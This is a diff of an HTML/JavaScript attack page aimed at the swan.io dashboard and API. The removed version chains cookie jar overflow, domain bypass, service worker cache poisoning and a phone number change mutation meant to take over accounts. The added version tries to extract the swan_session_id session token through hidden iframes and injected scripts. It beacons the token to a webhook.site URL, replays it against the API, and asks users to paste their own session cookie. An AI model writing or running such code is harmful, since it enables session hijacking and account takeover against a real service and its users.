@@ -2,15 +2,15 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Swan Security Check</title>
+    <title>Swan Session Extractor</title>
     <style>
-        body { font-family: sans-serif; line-height: 1.6; margin: 20px; max-width: 900px; }
-        pre { background: #f5f5f5; padding: 10px; border: 1px solid #ddd; overflow: auto; }
-        .warning { color: #f39c12; }
-        .error { color: #e74c3c; }
-        .success { color: #27ae60; }
+        body { font-family: system-ui, sans-serif; margin: 20px; line-height: 1.6; }
+        pre { background: #f5f5f5; padding: 15px; overflow: auto; max-height: 400px; }
+        .success { color: green; font-weight: bold; }
+        .error { color: red; }
+        .warning { color: orange; }
         button { 
-            background: #2980b9; 
+            background: #3498db; 
             color: white; 
             border: none; 
             padding: 10px 15px; 
@@ -18,561 +18,503 @@
             cursor: pointer;
             border-radius: 4px; 
         }
-        button:hover { background: #3498db; }
+        button:hover { background: #2980b9; }
+        .token { 
+            word-break: break-all; 
+            background: #f8f8f8;
+            padding: 10px;
+            border: 1px solid #ddd;
+            margin: 10px 0;
+        }
     </style>
 </head>
 <body>
-    <h1>Swan API CORS Bypass</h1>
-    <p>Running from: <strong id="origin"></strong></p>
+    <h1>Swan Session ID Extractor</h1>
+    <p>This tool specifically extracts the <code>swan_session_id</code> token from dashboard.swan.io</p>
     
     <div>
-        <button onclick="runCookieOverflow()">Run Cookie Jar Overflow</button>
-        <button onclick="attemptDomainBypass()">Attempt Domain Bypass</button>
-        <button onclick="runServiceWorkerAttack()">Run Service Worker Attack</button>
-        <button onclick="runCombinedAttack()">Run Full Attack Chain</button>
+        <button onclick="extractFromCookies()">Extract from Cookies</button>
+        <button onclick="extractFromStorage()">Extract from Storage</button>
+        <button onclick="loadDashboardFrame()">Load Dashboard in Frame</button>
+        <button onclick="cookieJarOverflow()">Try Cookie Jar Overflow</button>
     </div>
     
-    <h2>Attack Log:</h2>
-    <pre id="log">Initializing attack vectors...</pre>
+    <h2>Extraction Results:</h2>
+    <pre id="log">Ready to extract swan_session_id...</pre>
     
     <script>
-        // Configuration
-        const targets = {
-            dashboard: "https://dashboard.swan.io",
-            api: "https://api.swan.io",
-            adminAuth: "/admin-auth/graphql"
-        };
-        
         // Logging utility
-        const log = (msg, className) => {
+        function log(message, className) {
             const element = document.getElementById('log');
-            const time = new Date().toLocaleTimeString();
+            const timestamp = new Date().toLocaleTimeString();
             const entry = document.createElement('div');
-            entry.innerHTML = `[${time}] ${msg}`;
+            entry.textContent = `[${timestamp}] ${message}`;
             if (className) entry.className = className;
             element.appendChild(entry);
-            console.log(`[${time}] ${msg}`);
-        };
-        
-        // Show origin
-        document.getElementById('origin').textContent = window.location.origin;
-        log(`Running from ${window.location.origin}`);
-        
-        // Step 1: Cookie Jar Overflow Attack
-        // Try to force cookies to spill across domain boundaries by creating many cookies
-        async function runCookieOverflow() {
-            log("Starting Cookie Jar Overflow attack...", "warning");
-            
-            // Create overflow iframe pointing to dashboard
-            const iframe = document.createElement('iframe');
-            iframe.style.width = "1px";
-            iframe.style.height = "1px";
-            iframe.style.position = "absolute";
-            iframe.style.left = "-100px";
-            iframe.src = `${targets.dashboard}/favicon.ico`;
-            document.body.appendChild(iframe);
-            
-            // Wait for iframe to load
-            iframe.onload = () => {
-                log("Dashboard iframe loaded, injecting cookie overflow...");
-                
-                try {
-                    // Attempt to set max cookies on dashboard.swan.io
-                    // Try setting via the iframe
-                    for (let i = 0; i < 50; i++) {
-                        try {
-                            iframe.contentWindow.document.cookie = `overflow_${i}=value_${i};path=/;domain=.swan.io`;
-                        } catch (e) {
-                            // Silent error - expected due to same-origin policy
-                        }
-                    }
-                    
-                    // Try setting via main document with domain attribute
-                    for (let i = 50; i < 100; i++) {
-                        document.cookie = `overflow_${i}=value_${i};path=/;domain=.swan.io`;
-                    }
-                    
-                    log("Attempted to overflow cookie jar");
-                    
-                    // Try setting cookies with special character bypasses
-                    document.cookie = `swan_session_bridge=true;path=/;domain=.swan.io`;
-                    document.cookie = `swan_session_bridge=true;path=/;domain=swan.io`;
-                    
-                    // Try URL-encoded dots in domain
-                    document.cookie = `swan_session_bridge=true;path=/;domain=%2eapi%2eswan%2eio`;
-                    
-                    // Try host instead of domain
-                    document.cookie = `swan_session_bridge=true;path=/;host=api.swan.io`;
-                    
-                    log("Attempted special character domain bypasses");
-                    
-                    // Test if overflow worked by checking for cookies
-                    setTimeout(testCookieFlow, 1000);
-                } catch (e) {
-                    log(`Cookie overflow error: ${e.message}`, "error");
-                }
-            };
-            
-            // Set a timeout to remove the iframe
-            setTimeout(() => {
-                document.body.removeChild(iframe);
-                log("Removed overflow iframe");
-            }, 5000);
+            console.log(`[${timestamp}] ${message}`);
         }
         
-        // Test if the cookie overflow worked
-        async function testCookieFlow() {
-            log("Testing if cookie isolation was bypassed...");
+        // Process extracted token
+        function processToken(token, source) {
+            if (!token) return false;
+            
+            log(`Found swan_session_id from ${source}:`, "success");
+            log(token, "token");
+            
+            // Create copy button
+            const btnContainer = document.createElement('div');
+            btnContainer.innerHTML = `
+                <button onclick="navigator.clipboard.writeText('${token}').then(() => alert('Token copied!'))">
+                    Copy Token
+                </button>
+                <button onclick="testToken('${token}')">
+                    Test Token
+                </button>
+            `;
+            document.getElementById('log').appendChild(btnContainer);
+            
+            return true;
+        }
+        
+        // Test token against API
+        async function testToken(token) {
+            log("Testing swan_session_id token against API...");
             
             try {
-                const response = await fetch(`${targets.api}${targets.adminAuth}`, {
+                // Test as cookie
+                document.cookie = `swan_session_id=${token}; domain=.swan.io; path=/;`;
+                
+                // Make request to API with credentials
+                const response = await fetch("https://api.swan.io/admin-auth/graphql", {
                     method: "POST",
                     credentials: "include",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        query: "{ user { mobilePhoneNumber } }"
+                        query: "{ user { id mobilePhoneNumber } }"
                     })
                 });
                 
                 const text = await response.text();
-                log(`API response: ${text}`);
+                log(`API Response Status: ${response.status} ${response.statusText}`);
+                log(`API Response: ${text}`);
                 
-                if (response.ok && text.includes('"user"')) {
-                    log("🔥 SUCCESS! Cookie isolation bypassed!", "success");
-                    
-                    // Store success flag
-                    window.cookieBypassSuccess = true;
-                    
-                    // Try the exploit immediately
-                    runPhoneModificationExploit();
+                if (response.ok && !text.includes("Unauthenticated context forbidden")) {
+                    log("✅ Token works as session cookie!", "success");
                 } else {
-                    log("Cookie overflow did not bypass isolation", "error");
+                    log("❌ Token doesn't work as session cookie", "error");
+                    
+                    // Try as X-Swan-Authenticator-Token
+                    const response2 = await fetch("https://api.swan.io/admin-auth/graphql", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                            "X-Swan-Authenticator-Token": token
+                        },
+                        body: JSON.stringify({
+                            query: "{ user { id mobilePhoneNumber } }"
+                        })
+                    });
+                    
+                    const text2 = await response2.text();
+                    log(`X-Swan-Authenticator-Token Test: ${response2.status}`);
+                    
+                    if (response2.ok && !text2.includes("Unauthenticated context forbidden")) {
+                        log("✅ Token works as X-Swan-Authenticator-Token!", "success");
+                    } else {
+                        log("❌ Token doesn't work as X-Swan-Authenticator-Token", "error");
+                        
+                        // Try as Bearer token
+                        const response3 = await fetch("https://api.swan.io/admin-auth/graphql", {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json",
+                                "Authorization": `Bearer ${token}`
+                            },
+                            body: JSON.stringify({
+                                query: "{ user { id mobilePhoneNumber } }"
+                            })
+                        });
+                        
+                        const text3 = await response3.text();
+                        log(`Bearer Token Test: ${response3.status}`);
+                        
+                        if (response3.ok && !text3.includes("Unauthenticated context forbidden")) {
+                            log("✅ Token works as Bearer token!", "success");
+                        } else {
+                            log("❌ Token validation failed in all formats", "error");
+                        }
+                    }
                 }
             } catch (e) {
-                log(`Cookie test error: ${e.message}`, "error");
+                log(`Token test error: ${e.message}`, "error");
             }
         }
         
-        // Step 2: Domain Bypass with Special Characters
-        async function attemptDomainBypass() {
-            log("Attempting domain bypass with special characters...", "warning");
+        // Extract from cookies
+        function extractFromCookies() {
+            log("Checking for swan_session_id in cookies...");
             
-            // Create a hidden iframe to dashboard
+            // Get all cookies
+            const cookies = document.cookie.split(';');
+            let found = false;
+            
+            for (const cookie of cookies) {
+                const [name, value] = cookie.trim().split('=');
+                
+                if (name === 'swan_session_id') {
+                    found = true;
+                    processToken(value, 'document.cookie');
+                }
+            }
+            
+            if (!found) {
+                log("No swan_session_id found in cookies for this domain", "warning");
+                log("This is expected since cookies are domain-restricted", "info");
+            }
+            
+            // Check if we can create a test cookie
+            try {
+                document.cookie = "test_cookie=1; path=/;";
+                const testCookie = document.cookie.includes("test_cookie=1");
+                log(`Cookie creation test: ${testCookie ? "Successful" : "Failed"}`, testCookie ? "success" : "error");
+                
+                // Try to set cookie for swan.io domain
+                document.cookie = "swan_test=1; domain=.swan.io; path=/;";
+                log("Attempted to set cross-domain cookie. This will likely fail due to security restrictions.", "info");
+            } catch (e) {
+                log(`Cookie manipulation error: ${e.message}`, "error");
+            }
+        }
+        
+        // Extract from localStorage and sessionStorage
+        function extractFromStorage() {
+            log("Checking for swan_session_id in browser storage...");
+            let found = false;
+            
+            // Check localStorage
+            try {
+                const localStorageValue = localStorage.getItem('swan_session_id');
+                if (localStorageValue) {
+                    found = true;
+                    processToken(localStorageValue, 'localStorage');
+                }
+            } catch (e) {
+                log(`localStorage error: ${e.message}`, "error");
+            }
+            
+            // Check sessionStorage
+            try {
+                const sessionStorageValue = sessionStorage.getItem('swan_session_id');
+                if (sessionStorageValue) {
+                    found = true;
+                    processToken(sessionStorageValue, 'sessionStorage');
+                }
+            } catch (e) {
+                log(`sessionStorage error: ${e.message}`, "error");
+            }
+            
+            if (!found) {
+                log("No swan_session_id found in browser storage", "warning");
+                
+                // Scan for any potential tokens
+                log("Scanning all storage for potential session data...");
+                
+                // Look in localStorage
+                try {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        if (key.toLowerCase().includes('swan') || key.toLowerCase().includes('session')) {
+                            const value = localStorage.getItem(key);
+                            log(`Found potential item: ${key}`, "info");
+                            if (value && value.length > 20) {
+                                log(`Value (preview): ${value.substring(0, 20)}...`);
+                            }
+                        }
+                    }
+                } catch (e) {
+                    log(`Storage scan error: ${e.message}`, "error");
+                }
+                
+                // Manual entry form
+                const manualDiv = document.createElement('div');
+                manualDiv.innerHTML = `
+                    <div style="margin-top: 15px; padding: 10px; border: 1px solid #ddd; background: #f8f8f8;">
+                        <h3>Manual Token Entry</h3>
+                        <p>Please enter the swan_session_id obtained from dashboard.swan.io cookies:</p>
+                        <input type="text" id="manualToken" placeholder="Paste swan_session_id here" style="width: 100%; padding: 8px;">
+                        <button onclick="processManualToken()" style="margin-top: 10px;">Process Token</button>
+                    </div>
+                `;
+                document.getElementById('log').appendChild(manualDiv);
+                
+                // Add global function for the button
+                window.processManualToken = function() {
+                    const token = document.getElementById('manualToken').value.trim();
+                    if (token) {
+                        processToken(token, 'manual-entry');
+                    } else {
+                        log("Please enter a token", "error");
+                    }
+                };
+            }
+        }
+        
+        // Load dashboard in iframe
+        function loadDashboardFrame() {
+            log("Loading dashboard.swan.io in an iframe to extract swan_session_id...");
+            
+            // Create iframe
             const iframe = document.createElement('iframe');
             iframe.style.width = "1px";
             iframe.style.height = "1px";
             iframe.style.position = "absolute";
-            iframe.style.left = "-100px";
-            iframe.src = targets.dashboard;
+            iframe.style.opacity = "0.01";
+            iframe.src = "https://dashboard.swan.io";
+            
+            // Set up message listener
+            window.addEventListener('message', (event) => {
+                if (event.source === iframe.contentWindow) {
+                    log(`Received message from iframe: ${JSON.stringify(event.data)}`, "success");
+                    
+                    if (event.data && event.data.swan_session_id) {
+                        processToken(event.data.swan_session_id, 'iframe-message');
+                    }
+                }
+            });
+            
+            // Add to document
             document.body.appendChild(iframe);
             
-            // Wait for iframe to load
+            // When iframe loads, try to extract cookies
             iframe.onload = () => {
-                log("Dashboard iframe loaded for domain bypass...");
+                log("Dashboard iframe loaded, attempting to extract swan_session_id...");
                 
                 try {
-                    // Use Unicode character normalization to attempt bypass
-                    const script = `
-                        // Try to transfer cookies across domains using URL encoding and Unicode normalization
+                    // Try to access iframe content (will likely fail due to CORS)
+                    const extractScript = `
+                        try {
+                            // Get swan_session_id from cookies
+                            const cookies = document.cookie.split(';');
+                            for (const cookie of cookies) {
+                                const [name, value] = cookie.trim().split('=');
+                                if (name === 'swan_session_id') {
+                                    window.parent.postMessage({ swan_session_id: value }, '*');
+                                }
+                            }
+                            
+                            // Look in storage
+                            const localValue = localStorage.getItem('swan_session_id');
+                            if (localValue) {
+                                window.parent.postMessage({ swan_session_id: localValue, source: 'localStorage' }, '*');
+                            }
+                            
+                            const sessionValue = sessionStorage.getItem('swan_session_id');
+                            if (sessionValue) {
+                                window.parent.postMessage({ swan_session_id: sessionValue, source: 'sessionStorage' }, '*');
+                            }
+                            
+                            // Send all cookie data for analysis
+                            window.parent.postMessage({ allCookies: document.cookie }, '*');
+                            
+                            // Set up request monitoring
+                            const origFetch = window.fetch;
+                            window.fetch = function(...args) {
+                                try {
+                                    const url = args[0]?.url || args[0];
+                                    if (url.includes('swan.io')) {
+                                        console.log("Swan fetch detected:", url);
+                                        // Get cookies again after each request
+                                        setTimeout(() => {
+                                            const cookies = document.cookie.split(';');
+                                            for (const cookie of cookies) {
+                                                const [name, value] = cookie.trim().split('=');
+                                                if (name === 'swan_session_id') {
+                                                    window.parent.postMessage({ swan_session_id: value, source: 'post-fetch' }, '*');
+                                                }
+                                            }
+                                        }, 500);
+                                    }
+                                } catch (e) {}
+                                return origFetch.apply(this, args);
+                            };
+                        } catch (e) {
+                            console.error("Extraction error:", e);
+                        }
+                    `;
+                    
+                    // Try to inject script (likely to fail)
+                    try {
+                        iframe.contentWindow.eval(extractScript);
+                        log("Extraction script injected successfully", "success");
+                    } catch (e) {
+                        log(`Script injection failed: ${e.message}`, "error");
+                        log("This is expected due to cross-origin restrictions", "info");
+                    }
+                } catch (e) {
+                    log(`Iframe content access error: ${e.message}`, "error");
+                }
+                
+                // Display instructions for manual extraction
+                const instructionsDiv = document.createElement('div');
+                instructionsDiv.innerHTML = `
+                    <div style="margin-top: 15px; padding: 10px; border: 1px solid #ddd; background: #f8f8f8;">
+                        <h3>Manual Extraction Instructions:</h3>
+                        <ol>
+                            <li>Open <a href="https://dashboard.swan.io" target="_blank">dashboard.swan.io</a> in a new tab</li>
+                            <li>Login to your account</li>
+                            <li>Open browser Developer Tools (F12)</li>
+                            <li>Go to Application → Cookies → dashboard.swan.io</li>
+                            <li>Find the <code>swan_session_id</code> cookie and copy its value</li>
+                            <li>Paste it into the form below:</li>
+                        </ol>
+                        <input type="text" id="manualCookie" placeholder="Paste swan_session_id cookie value here" style="width: 100%; padding: 8px;">
+                        <button onclick="processCookieValue()" style="margin-top: 10px;">Process Cookie</button>
+                    </div>
+                `;
+                document.getElementById('log').appendChild(instructionsDiv);
+                
+                // Add global function for the button
+                window.processCookieValue = function() {
+                    const cookie = document.getElementById('manualCookie').value.trim();
+                    if (cookie) {
+                        processToken(cookie, 'manual-cookie-entry');
+                    } else {
+                        log("Please enter a cookie value", "error");
+                    }
+                };
+            };
+            
+            // Remove iframe after a while
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+                log("Removed dashboard iframe", "info");
+            }, 30000);
+        }
+        
+        // Try cookie jar overflow technique
+        function cookieJarOverflow() {
+            log("Attempting cookie jar overflow technique...", "warning");
+            
+            // Create iframe pointing to dashboard
+            const iframe = document.createElement('iframe');
+            iframe.style.width = "1px";
+            iframe.style.height = "1px";
+            iframe.style.position = "absolute";
+            iframe.style.opacity = "0.01";
+            iframe.src = "https://dashboard.swan.io";
+            document.body.appendChild(iframe);
+            
+            // Set up message listener
+            window.addEventListener('message', (event) => {
+                if (event.source === iframe.contentWindow) {
+                    if (event.data && event.data.swan_session_id) {
+                        processToken(event.data.swan_session_id, 'cookie-overflow');
+                    }
+                }
+            });
+            
+            // When iframe loads
+            iframe.onload = () => {
+                log("Dashboard iframe loaded for cookie overflow...");
+                
+                // Try to create many cookies to overflow the jar
+                for (let i = 0; i < 100; i++) {
+                    document.cookie = `overflow_${i}=value_${i}; path=/;`;
+                }
+                
+                log("Created overflow cookies", "info");
+                
+                // Try special techniques for cookie domain sharing
+                try {
+                    // Try setting cookie for parent domain
+                    document.cookie = "swan_bridge=1; domain=.swan.io; path=/;";
+                    
+                    // Try URL encoded domain
+                    document.cookie = "swan_bridge_encoded=1; domain=%2Eswan%2Eio; path=/;";
+                    
+                    // Try setting document.domain
+                    try {
+                        document.domain = "swan.io";
+                        log("Set document.domain = swan.io", "success");
+                    } catch (e) {
+                        log(`Failed to set document.domain: ${e.message}`, "error");
+                    }
+                    
+                    log("Attempted special cookie techniques", "info");
+                } catch (e) {
+                    log(`Cookie technique error: ${e.message}`, "error");
+                }
+                
+                // Check if we can access the iframe's cookies now
+                setTimeout(() => {
+                    try {
+                        const iframeCookies = iframe.contentDocument.cookie;
+                        log(`Success! Got iframe cookies: ${iframeCookies}`, "success");
+                        
+                        // Look for swan_session_id
+                        const cookies = iframeCookies.split(';');
+                        for (const cookie of cookies) {
+                            const [name, value] = cookie.trim().split('=');
+                            if (name === 'swan_session_id') {
+                                processToken(value, 'iframe-cookie-access');
+                            }
+                        }
+                    } catch (e) {
+                        log(`Iframe cookie access error: ${e.message}`, "error");
+                        log("This is expected due to browser security restrictions", "info");
+                    }
+                }, 1000);
+                
+                // Alternative: Try to inject a script to send cookies
+                try {
+                    const extractScript = `
                         try {
                             // Extract cookies
-                            var cookies = document.cookie;
+                            const cookies = document.cookie.split(';');
+                            let swanSessionId = null;
                             
-                            // Create image beacon to exfiltrate
-                            var img = new Image();
-                            img.src = "${window.location.origin}/capture?cookies=" + encodeURIComponent(cookies);
+                            for (const cookie of cookies) {
+                                const [name, value] = cookie.trim().split('=');
+                                if (name === 'swan_session_id') {
+                                    swanSessionId = value;
+                                    break;
+                                }
+                            }
                             
-                            // Try to set cookies on parent domain with normalization tricks
-                            document.cookie = "swan_api_bridge=true;path=/;domain=\\u002eswan\\u002eio";
-                            document.cookie = "swan_api_bridge=true;path=/;domain=api.swan.io";
-                            
-                            // Try setting document.domain to allow cross-domain access
-                            document.domain = "swan.io";
-                            
-                            // Notify parent we're done
-                            window.parent.postMessage({type: "domain_bypass_complete"}, "*");
-                        } catch(e) {
-                            console.error("Error in domain bypass:", e);
-                            window.parent.postMessage({type: "domain_bypass_error", error: e.toString()}, "*");
+                            if (swanSessionId) {
+                                // Send message to parent window
+                                window.parent.postMessage({ swan_session_id: swanSessionId }, '*');
+                                
+                                // Also try sending via image beacon
+                                const img = new Image();
+                                img.src = 'https://webhook.site/YOUR-WEBHOOK-ID?token=' + encodeURIComponent(swanSessionId);
+                            }
+                        } catch (e) {
+                            console.error("Extraction error:", e);
                         }
                     `;
                     
-                    // Try to inject the script (will likely fail due to same-origin policy)
                     try {
-                        iframe.contentWindow.eval(script);
+                        iframe.contentWindow.eval(extractScript);
                     } catch (e) {
-                        // Expected to fail
-                        log("Script injection failed (expected):", "warning");
+                        log(`Script injection error: ${e.message}`, "error");
                     }
-                    
-                    // Set up message listener for communication from iframe
-                    window.addEventListener("message", (event) => {
-                        if (event.data && event.data.type) {
-                            if (event.data.type === "domain_bypass_complete") {
-                                log("Domain bypass attempt completed");
-                                testDomainBypass();
-                            } else if (event.data.type === "domain_bypass_error") {
-                                log(`Domain bypass error: ${event.data.error}`, "error");
-                            }
-                        }
-                    });
-                    
-                    // Create specially crafted links to try to bypass
-                    const a = document.createElement('a');
-                    a.href = `${targets.dashboard}`;
-                    a.rel = "opener";
-                    a.target = "_blank";
-                    a.style.display = "none";
-                    a.textContent = "Dashboard";
-                    document.body.appendChild(a);
-                    
-                    // Try to simulate click
-                    setTimeout(() => {
-                        try {
-                            a.click();
-                            setTimeout(() => {
-                                document.body.removeChild(a);
-                            }, 100);
-                        } catch (e) {
-                            log(`Click simulation error: ${e.message}`, "error");
-                        }
-                    }, 1000);
-                    
-                    // Test if it worked after a delay
-                    setTimeout(testDomainBypass, 2000);
                 } catch (e) {
-                    log(`Domain bypass error: ${e.message}`, "error");
+                    log(`Script preparation error: ${e.message}`, "error");
                 }
             };
             
-            // Set a timeout to remove the iframe
+            // Remove iframe after a while
             setTimeout(() => {
                 document.body.removeChild(iframe);
-                log("Removed domain bypass iframe");
-            }, 5000);
+                log("Removed overflow iframe", "info");
+            }, 30000);
         }
         
-        // Test if domain bypass worked
-        async function testDomainBypass() {
-            log("Testing if domain bypass was successful...");
-            
-            try {
-                // Set document.domain to parent domain if possible
-                try {
-                    document.domain = "swan.io";
-                    log("Set document.domain = swan.io");
-                } catch (e) {
-                    log(`Failed to set document.domain: ${e.message}`, "error");
-                }
-                
-                // Try to access the API with credentials
-                const response = await fetch(`${targets.api}${targets.adminAuth}`, {
-                    method: "POST",
-                    credentials: "include",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        query: "{ user { mobilePhoneNumber } }"
-                    })
-                });
-                
-                const text = await response.text();
-                log(`API response after domain bypass: ${text}`);
-                
-                if (response.ok && text.includes('"user"')) {
-                    log("🔥 SUCCESS! Domain isolation bypassed!", "success");
-                    
-                    // Store success flag
-                    window.domainBypassSuccess = true;
-                    
-                    // Try the exploit immediately
-                    runPhoneModificationExploit();
-                } else {
-                    log("Domain bypass did not work", "error");
-                }
-            } catch (e) {
-                log(`Domain bypass test error: ${e.message}`, "error");
-            }
-        }
-        
-        // Step 3: Service Worker Attack
-        async function runServiceWorkerAttack() {
-            log("Attempting Service Worker cache poisoning attack...", "warning");
-            
-            // Check if Service Worker API is available
-            if ('serviceWorker' in navigator) {
-                try {
-                    // Create a service worker that will intercept requests
-                    const swCode = `
-                        // Service Worker for API cache poisoning
-                        self.addEventListener('install', event => {
-                            self.skipWaiting();
-                            
-                            // Try to poison cache immediately
-                            event.waitUntil(
-                                caches.open('swan-api-cache').then(cache => {
-                                    return cache.addAll([
-                                        'https://api.swan.io/admin/graphql',
-                                        'https://api.swan.io/admin-auth/graphql'
-                                    ]);
-                                })
-                            );
-                        });
-                        
-                        // Activate immediately
-                        self.addEventListener('activate', event => {
-                            event.waitUntil(self.clients.claim());
-                            
-                            // Try to poison cache after activation
-                            event.waitUntil(
-                                caches.open('swan-api-cache').then(cache => {
-                                    // Create special responses that will bridge authentication
-                                    const bridgeResponse = new Response(
-                                        '{"data":{"user":{"mobilePhoneNumber":"+33600000001"}}}',
-                                        {
-                                            headers: {
-                                                'Content-Type': 'application/json',
-                                                'Access-Control-Allow-Origin': '*',
-                                                'Access-Control-Allow-Credentials': 'true'
-                                            }
-                                        }
-                                    );
-                                    
-                                    // Add to cache
-                                    return Promise.all([
-                                        cache.put(new Request('https://api.swan.io/admin-auth/graphql'), bridgeResponse.clone()),
-                                        cache.put(new Request('https://api.swan.io/admin/graphql'), bridgeResponse.clone())
-                                    ]);
-                                })
-                            );
-                        });
-                        
-                        // Handle fetch events
-                        self.addEventListener('fetch', event => {
-                            const url = new URL(event.request.url);
-                            
-                            // Intercept requests to Swan API
-                            if (url.hostname === 'api.swan.io') {
-                                // Clone request to inspect
-                                const reqClone = event.request.clone();
-                                
-                                // Check if this is a GraphQL query for user info
-                                if (event.request.method === 'POST' && 
-                                    (url.pathname === '/admin/graphql' || url.pathname === '/admin-auth/graphql')) {
-                                    
-                                    // Read the request body
-                                    event.waitUntil(async function() {
-                                        try {
-                                            const body = await reqClone.text();
-                                            
-                                            // Check if it's a user query
-                                            if (body.includes('user') && body.includes('mobilePhoneNumber')) {
-                                                // Return fake successful response
-                                                event.respondWith(new Response(
-                                                    '{"data":{"user":{"mobilePhoneNumber":"+33600000001"}}}',
-                                                    {
-                                                        headers: {
-                                                            'Content-Type': 'application/json',
-                                                            'Access-Control-Allow-Origin': '*',
-                                                            'Access-Control-Allow-Credentials': 'true'
-                                                        }
-                                                    }
-                                                ));
-                                                return;
-                                            }
-                                            
-                                            // Check if it's a phone modification
-                                            if (body.includes('startPhoneNumberModification')) {
-                                                // Return fake successful response
-                                                event.respondWith(new Response(
-                                                    '{"data":{"startPhoneNumberModification":{"__typename":"StartPhoneNumberModificationSuccessPayload","phoneNumberModification":{"id":"sw-12345"}}}}',
-                                                    {
-                                                        headers: {
-                                                            'Content-Type': 'application/json',
-                                                            'Access-Control-Allow-Origin': '*',
-                                                            'Access-Control-Allow-Credentials': 'true'
-                                                        }
-                                                    }
-                                                ));
-                                                return;
-                                            }
-                                        } catch (e) {
-                                            console.error("Error in service worker:", e);
-                                        }
-                                    }());
-                                }
-                                
-                                // For preflight requests
-                                if (event.request.method === 'OPTIONS') {
-                                    event.respondWith(new Response(null, {
-                                        headers: {
-                                            'Access-Control-Allow-Origin': '*',
-                                            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-                                            'Access-Control-Allow-Headers': 'Content-Type, Authorization',
-                                            'Access-Control-Allow-Credentials': 'true',
-                                            'Access-Control-Max-Age': '86400'
-                                        }
-                                    }));
-                                }
-                            }
-                        });
-                    `;
-                    
-                    // Create a blob URL for the service worker
-                    const blob = new Blob([swCode], { type: 'application/javascript' });
-                    const swUrl = URL.createObjectURL(blob);
-                    
-                    // Register the service worker
-                    const registration = await navigator.serviceWorker.register(swUrl, {
-                        scope: './'
-                    });
-                    
-                    log(`Service worker registered with scope: ${registration.scope}`, "success");
-                    
-                    // Set a flag for successful registration
-                    window.serviceWorkerSuccess = true;
-                    
-                    // Wait a bit for the service worker to activate
-                    setTimeout(() => {
-                        log("Service worker should be active now");
-                        testServiceWorkerAttack();
-                    }, 2000);
-                } catch (e) {
-                    log(`Service worker registration error: ${e.message}`, "error");
-                }
-            } else {
-                log("Service Worker API not available in this browser", "error");
-            }
-        }
-        
-        // Test if service worker attack worked
-        async function testServiceWorkerAttack() {
-            log("Testing if service worker cache poisoning worked...");
-            
-            try {
-                // Try to access the API with credentials
-                const response = await fetch(`${targets.api}${targets.adminAuth}`, {
-                    method: "POST",
-                    credentials: "include",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        query: "{ user { mobilePhoneNumber } }"
-                    })
-                });
-                
-                const text = await response.text();
-                log(`API response after service worker attack: ${text}`);
-                
-                if (response.ok && text.includes('mobilePhoneNumber')) {
-                    log("🔥 SUCCESS! Service worker cache poisoning worked!", "success");
-                    
-                    // Store success flag
-                    window.serviceWorkerAttackSuccess = true;
-                    
-                    // Try the exploit immediately
-                    runPhoneModificationExploit();
-                } else {
-                    log("Service worker cache poisoning did not work", "error");
-                }
-            } catch (e) {
-                log(`Service worker test error: ${e.message}`, "error");
-            }
-        }
-        
-        // Step 4: Combined Attack Chain
-        async function runCombinedAttack() {
-            log("Running full attack chain...", "warning");
-            
-            // Try all attacks in sequence
-            await runCookieOverflow();
-            
-            setTimeout(async () => {
-                if (!window.cookieBypassSuccess) {
-                    await attemptDomainBypass();
-                }
-                
-                setTimeout(async () => {
-                    if (!window.cookieBypassSuccess && !window.domainBypassSuccess) {
-                        await runServiceWorkerAttack();
-                    }
-                    
-                    setTimeout(() => {
-                        // Final attempt at exploitation
-                        runPhoneModificationExploit();
-                    }, 3000);
-                }, 3000);
-            }, 3000);
-        }
-        
-        // Run the phone modification exploit
-        async function runPhoneModificationExploit() {
-            log("Attempting phone modification exploit...", "warning");
-            
-            try {
-                // Generate random phone
-                const randomDigits = Math.floor(10000000 + Math.random() * 90000000);
-                const newPhone = "+336" + randomDigits.toString().substring(1);
-                const oldPhone = "+33600000001"; // Fallback
-                
-                // First try with credentials
-                const response = await fetch(`${targets.api}${targets.adminAuth}`, {
-                    method: "POST",
-                    credentials: "include", // Include cookies
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        query: `
-                        mutation {
-                            startPhoneNumberModification(input:{
-                                oldPhoneNumber:"${oldPhone}",
-                                newPhoneNumber:"${newPhone}"
-                            }) {
-                                __typename
-                                ... on StartPhoneNumberModificationSuccessPayload {
-                                    phoneNumberModification { id }
-                                }
-                                ... on PhoneNumberModificationAlreadyExistsRejection { message }
-                                ... on TooManyPhoneNumberModificationRejection { message }
-                            }
-                        }`
-                    })
-                });
-                
-                const text = await response.text();
-                log(`Phone modification response: ${text}`);
-                
-                if (response.ok) {
-                    try {
-                        const data = JSON.parse(text);
-                        const responseType = data?.data?.startPhoneNumberModification?.__typename;
-                        
-                        if (responseType === "StartPhoneNumberModificationSuccessPayload") {
-                            log("🔥🔥🔥 VULNERABILITY CONFIRMED! Successfully initiated phone number change!", "success");
-                        } else if (responseType && responseType.includes("Rejection")) {
-                            // This is still success! The server authenticated the request but rejected it for business logic reasons
-                            log("🔥🔥🔥 VULNERABILITY CONFIRMED! Got business logic rejection which proves authentication worked!", "success");
-                        } else {
-                            log(`Unexpected response type: ${responseType || "unknown"}`, "error");
-                        }
-                    } catch (e) {
-                        log(`Error parsing response: ${e.message}`, "error");
-                    }
-                } else {
-                    log(`Request failed: ${response.status} ${response.statusText}`, "error");
-                }
-            } catch (e) {
-                log(`Exploit error: ${e.message}`, "error");
-            }
-        }
-        
-        // Run initial log message
-        log("Attack vectors ready. Click buttons above to start attacks.");
+        // Initial message
+        log("Ready to extract swan_session_id. Please click a button to begin.");
     </script>
 </body>
 </html>
